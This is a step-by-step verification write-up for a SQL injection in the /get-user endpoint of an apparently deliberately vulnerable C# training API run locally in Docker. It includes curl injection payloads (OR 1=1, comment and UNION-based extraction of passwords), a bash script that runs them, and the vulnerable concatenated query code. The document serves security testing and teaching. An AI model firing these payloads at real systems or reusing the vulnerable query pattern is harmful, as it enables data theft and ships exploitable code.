# SQL Injection Vulnerability Verification Steps

This document provides step-by-step instructions to reproduce the SQL injection vulnerability verification.

## Prerequisites

- Docker and Docker Compose installed
- curl (or any HTTP client)
- jq (optional, for pretty JSON output)

## Step 1: Build and Start the Application

```bash
# Navigate to project directory
cd /home/runner/work/dvcsharp-api-dryrunsec/dvcsharp-api-dryrunsec

# Build and start with Docker Compose
docker compose up --build -d

# Wait for application to start (about 10-15 seconds)
sleep 15

# Check logs to ensure it's running
docker compose logs --tail=20
```

Expected output should include:
```
Now listening on: http://0.0.0.0:5000
Application started. Press Ctrl+C to shut down.
```

## Step 2: Register Test Users

Register two users to populate the database:

```bash
# Register user 'alice'
curl -X POST "http://localhost:5000/api/registrations" \
  -H "Content-Type: application/json" \
  -d '{"name":"alice","email":"alice@test.com","password":"password123","passwordConfirmation":"password123"}'

# Register user 'bob'
curl -X POST "http://localhost:5000/api/registrations" \
  -H "Content-Type: application/json" \
  -d '{"name":"bob","email":"bob@test.com","password":"password456","passwordConfirmation":"password456"}'
```

Expected responses: HTTP 200 with user details

## Step 3: Test Normal Behavior (Baseline)

```bash
# Test with existing user
curl "http://localhost:5000/get-user?username=alice"
```

**Expected Response:**
```json
{"message":"User found","username":"alice"}
```

```bash
# Test with non-existent user
curl "http://localhost:5000/get-user?username=nonexistent"
```

**Expected Response:**
```json
{"message":"User not found"}
```

## Step 4: Demonstrate SQL Injection Vulnerability

### Attack 1: OR 1=1 Bypass

```bash
curl "http://localhost:5000/get-user?username=x'%20OR%20'1'='1"
```

**What happens:**
- Input: `x' OR '1'='1`
- Generated SQL: `SELECT * FROM Users WHERE name = 'x' OR '1'='1'`
- User 'x' doesn't exist, but `'1'='1'` is always true
- Query returns first user from database

**Expected Response:**
```json
{"message":"User found","username":"alice"}
```

❌ **VULNERABILITY CONFIRMED** - Returns user even though 'x' doesn't exist!

### Attack 2: Comment Injection

```bash
curl "http://localhost:5000/get-user?username='%20OR%201=1%20--"
```

**What happens:**
- Input: `' OR 1=1 --`
- Generated SQL: `SELECT * FROM Users WHERE name = '' OR 1=1 --'`
- The `--` comments out the rest of the query
- `OR 1=1` makes condition always true

**Expected Response:**
```json
{"message":"User found","username":"alice"}
```

❌ **VULNERABILITY CONFIRMED** - Bypasses authentication logic!

### Attack 3: UNION-based Injection (Information Disclosure)

```bash
curl "http://localhost:5000/get-user?username='%20UNION%20SELECT%20name,email,role,password,1,2,3%20FROM%20Users%20--"
```

**What happens:**
- Attempts to extract additional columns from Users table
- Could potentially expose sensitive data like passwords

## Step 5: Compare Results

Create a test script to show all results side-by-side:

```bash
cat > test_sqli.sh << 'EOF'
#!/bin/bash

echo "====================================="
echo "SQL INJECTION VERIFICATION TEST"
echo "====================================="
echo ""

echo "1. BASELINE - Valid user 'alice':"
curl -s "http://localhost:5000/get-user?username=alice" | jq .
echo ""

echo "2. BASELINE - Invalid user 'nonexistent':"
curl -s "http://localhost:5000/get-user?username=nonexistent" | jq .
echo ""

echo "3. ATTACK - SQL Injection (OR 1=1):"
echo "   Input: x' OR '1'='1"
curl -s "http://localhost:5000/get-user?username=x'%20OR%20'1'='1" | jq .
echo ""

echo "4. ATTACK - SQL Injection (Comment):"
echo "   Input: ' OR 1=1 --"
curl -s "http://localhost:5000/get-user?username='%20OR%201=1%20--" | jq .
echo ""

echo "====================================="
echo "CONCLUSION: Vulnerability CONFIRMED"
echo "====================================="
EOF

chmod +x test_sqli.sh
./test_sqli.sh
```

## Step 6: Cleanup

```bash
# Stop the application
docker compose down

# Optional: Remove the database
rm -f tmp/DVCSharp.db
```

## Vulnerable Code

Location: `Controllers/ApiController.cs`, line 23

```csharp
[HttpGet("/get-user")]
public IActionResult GetUser(string username)
{
    using (SqliteConnection conn = new SqliteConnection(_connectionString))
    {
        conn.Open();
        // VULNERABLE: Direct string concatenation
        string query = "SELECT * FROM Users WHERE name = '" + username + "'";
        using (SqliteCommand cmd = new SqliteCommand(query, conn))
        {
            using (SqliteDataReader reader = cmd.ExecuteReader())
            {
                if (reader.Read())
                {
                    return Ok(new { message = "User found", username = reader["name"] });
                }
            }
        }
    }
    return NotFound(new { message = "User not found" });
}
```

## Why This Is Vulnerable

1. **No Input Validation**: The `username` parameter is not sanitized
2. **String Concatenation**: User input is directly concatenated into SQL query
3. **No Parameterized Queries**: Should use `SqliteParameter` instead
4. **No Escaping**: Special characters like `'` are not escaped

## Impact

- **Severity**: CRITICAL (OWASP A03:2021)
- **CWE-89**: SQL Injection
- **Exploitable**: Yes, multiple attack vectors confirmed
- **Data at Risk**: All user records in the database

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
- [CISA Bad Practices](https://www.cisa.gov/resources-tools/resources/product-security-bad-practices)

---

**Date**: October 17, 2025  
**Status**: Vulnerability Verified ✅  
**Action Required**: None (verification only, no fix required as per task)
